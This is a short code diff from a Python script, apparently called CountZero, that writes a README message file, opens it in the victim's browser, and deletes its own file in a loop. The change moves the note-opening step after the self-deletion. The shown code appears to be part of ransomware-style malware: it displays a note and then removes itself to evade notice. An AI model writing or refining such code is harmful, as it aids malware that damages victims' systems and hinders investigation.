@@ -170,8 +170,6 @@ with open("CountZero.README.txt", "w") as fl:
 # ---------------------------------------------------------------------- #
 # Open message file and vanish:
 # ---------------------------------------------------------------------- #
-# Open file:
-webbrowser.open("file://{0}/CountZero.README.txt".format(os.getcwd()), new=2)
 # Vanish:
 try:
     for i in range(10):
@@ -183,3 +181,5 @@ try:
     os.unlink(new_name)
 except Exception as error:
     print(error)
+# Open file:
+webbrowser.open("file://{0}/CountZero.README.txt".format(os.getcwd()), new=2)
